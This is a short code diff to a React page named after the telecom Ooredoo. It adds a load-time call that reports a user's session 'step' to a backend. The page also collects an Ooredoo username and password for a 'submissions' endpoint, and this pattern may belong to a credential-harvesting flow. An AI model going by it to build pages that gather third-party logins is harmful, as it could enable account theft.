@@ -1,4 +1,4 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useLocation, useSearch } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
@@ -17,6 +17,17 @@ export default function Ooredoo() {
   const [ooredooUser, setOoredooUser] = useState("");
   const [ooredooPassword, setOoredooPassword] = useState("");
   const submitOoredooMutation = trpc.submissions.submitOoredoo.useMutation();
+  const reportStepMutation = trpc.submissions.reportStep.useMutation();
+
+  useEffect(() => {
+    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
+    if (currentSessionId) {
+      reportStepMutation.mutate({
+        sessionId: currentSessionId,
+        step: "ooredoo"
+      });
+    }
+  }, []);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
